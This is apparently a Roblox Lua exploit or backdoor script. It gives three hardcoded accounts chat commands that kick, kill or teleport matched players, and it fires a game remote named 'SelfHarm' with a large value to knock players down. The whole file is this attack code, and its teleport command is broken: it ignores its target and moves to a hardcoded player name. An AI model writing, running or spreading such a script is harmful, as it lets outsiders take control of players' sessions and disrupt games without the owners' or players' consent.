local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Admins = {
	["goldenchicayfredyy"] = true,
	["nopitching"] = true,
	["1049c4"] = true,
}

local function FindUser(Name)
	if #Name < 3 then
		return nil
	end

	Name = string.lower(Name)
	for _, player in pairs(Players:GetPlayers()) do
		if string.sub(string.lower(player.Name), 1, #Name) == Name then
			return player
		end
	end
	return nil
end

local commands = {
	kick = function(targetPlayer)
		targetPlayer:Kick("kicked by a tear admin")
	end,
	kill = function(targetPlayer)
		targetPlayer.Character.Humanoid.Health = 0
	end,
	teleport = function(targetPlayer)
		LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players"):WaitForChild("JoeheIsTheGOAT").Character.HumanoidRootPart.CFrame
	end,
	down = function(targetPlayer)
		local args = {
			[1] = 10000
		}

		game:GetService("ReplicatedStorage"):WaitForChild("GameRemotes"):WaitForChild("Other"):WaitForChild("SelfHarm"):FireServer(unpack(args))
	end,
}

game:GetService("Players").PlayerAdded:Connect(function(player)
	if Admins[player.Name] then
		player.Chatted:Connect(function(Msg)
			local command, target = Msg:lower():match("^/e%s+([^%s]+)%s+(.*)$")
			if not command then
				command, target = Msg:lower():match("^([^%s]+)%s+(.*)$")
			end
			if command and commands[command] then
				local targetPlayer = FindUser(target)
				if targetPlayer then
					commands[command](targetPlayer)
				else
					return
				end
			elseif not commands[command] then
				return
			end
		end)
	end
end)
